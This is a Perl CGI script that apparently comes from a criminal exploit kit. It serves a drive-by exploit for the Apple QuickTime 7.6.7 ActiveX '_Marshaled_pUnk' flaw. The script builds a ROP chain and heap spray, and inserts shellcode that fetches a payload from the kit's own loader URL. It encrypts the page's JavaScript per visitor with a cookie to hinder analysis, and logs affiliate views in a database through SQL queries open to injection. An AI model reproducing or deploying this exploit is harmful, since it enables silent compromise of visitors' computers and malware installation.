#!/usr/bin/perl

#
#  Apple QuickTime 7.6.7 activeX _Marshaled_pUnk Code Execution
#
#  TESTED  and working on Windows XP sp2 mce (take long time because bypassing aslr + dep)
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET quicktime_marshaled=quicktime_marshaled+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET quicktime_marshaled=quicktime_marshaled+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#exec code vars
$ret = '0x677a0000';
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=quicktime_marshaled';
$shellcode = Shellcode::getsmallshell($urlllll);
$spray_target = '0x15220c20';
$rop_mod_base = $ret;

$prependshellcode = '%u0c18%u1522%u9c12%u6781%u1e27%u677a%u0088%u6791%u0244%u677b%u509e%u677a%u0110%u0104%u0101%u0101%u0101%u0101%u307a%u677a%u8000%u0000%ufb5b%u6785%u1e27%u677a%u62d4%u679a%u8fd6%u677a%u4fd5%u678d%u3ff8%u678a%u4141%u4141%u1e27%u677a%u0080%u0000%u78d2%u6781%u4141%u4141%u4141%u4141%u1e27%u677a%u62d4%u679a%u0244%u677b%u307a%u677a%u0084%u0000%ufb5b%u6785%u509e%u677a%ubeef%udead';

$sploit = $prependshellcode . $shellcode;

#JAVASCRIPT DATA
my $data = <<EOF;

function Prepare()
{
	var block = unescape("$sploit");
	while(block.length < 0x200)
		block += unescape("%u0000");
	heap = new heapLib.ie(0x20000);
	while(block.length < 0x80000)
		block += block;
	finalspray = block.substring(2, 0x80000 - 0x21);
	for(var i = 0; i < 350; i++)
	{
	heap.alloc(finalspray);
	}
}

function start()
{
	var obj = '<' + 'object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0"'+'>'
		+ '</'+ 'object>';
	document.getElementById('stb').innerHTML = obj;
	Prepare();
	var targ = $spray_target;
	var obj = '<' + 'object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0"' + '>'
		+ '<' + 'PARAM name="_Marshaled_pUnk" value="' + targ + '"' + '/>'
		+ '</'+ 'object>';
	document.getElementById('xpl').innerHTML = obj;
}

EOF

#open the heaplib.js (thanks metasploit)
open(FILE,"<../dep/heaplib.js");
while(<FILE>)
{
  $data2 .= $_;
}

$alldatajs = $data2 . $data;


$beforexoredd = EncRand::CsCrypt($alldatajs,$csname,$theCookie);


$content = <<EOF;

<html>
<head>
<script language="javascript">
$beforexoredd
</script>
</head>
<body onload="start()">
<div id="stb"></div>
<div id="xpl"></div>
</body>
</html>

EOF

###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print "$content";
####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
